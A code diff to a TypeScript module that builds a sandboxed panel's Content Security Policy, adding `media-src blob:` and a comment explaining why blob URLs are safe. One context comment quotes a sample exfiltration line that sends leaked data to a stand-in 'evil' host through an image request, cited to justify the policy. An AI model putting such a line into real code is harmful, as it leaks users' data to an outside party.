@@ -43,6 +43,13 @@ export function readDocumentCspNonce(doc: Document = document): string {
  * 契约），放行任意 `https:` 会给 `new Image().src='https://evil/?d='+leak`
  * 留零门槛 GET 外带通道——与 fetch/sendBeacon 同罪，一并闭合。
  *
+ * media-src 放行 `blob:`（#1146）：面板经桥 readArtifactBytes 拿到媒体字节
+ * 后用 URL.createObjectURL 在本帧建 blob URL 喂 <video>/<audio>。blob URL
+ * 只能由面板自身脚本在本帧创建（opaque origin 的 blob 命名空间归本帧），
+ * 媒体字节全部来自桥——不是网络子资源，不构成出站面；不写平台 origin 与
+ * data:（无实际引用面）。宿主文档头策略的 media-src 本就含 blob:，本条
+ * 只是把被 default-src 'none' 压死的媒体元素放开。
+ *
  * 本策略的 script-src 保持 'unsafe-inline'（不写 nonce）：nonce 管控由继承
  * 的宿主头策略负责；这里若也写 nonce，实例设置的 CSP 兼容模式
  * （csp_script_unsafe_inline）就无法让 inline 事件属性复活。
@@ -63,6 +70,8 @@ export function buildPanelCsp(): string {
     // data: 内联图（单文件 bundle 的常见模式）；远程图不再放行——远程
     // 图源是任意外带 URL 的载体，产品取舍见函数头注释。
     `img-src data:${withOrigin}`,
+    // #1146：面板自建 blob 的 <video>/<audio>（readArtifactBytes）。
+    `media-src blob:`,
     // 面板经桥取数，不需要任何 XHR/fetch；connect-src 收紧到平台 origin，
     // 堵死 fetch/sendBeacon 外传通道。
     `connect-src${withOrigin}`,
